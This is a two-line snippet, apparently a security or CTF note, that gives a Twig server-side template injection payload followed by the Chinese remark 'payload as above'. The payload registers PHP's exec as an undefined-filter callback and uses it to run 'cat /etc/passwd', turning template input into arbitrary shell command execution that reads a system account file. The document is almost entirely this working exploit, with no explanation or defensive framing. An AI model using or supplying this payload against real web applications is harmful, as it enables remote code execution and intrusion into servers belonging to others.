``` php
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('a=cat;b=/etc/passwd;$a $b')}}
```

payload如上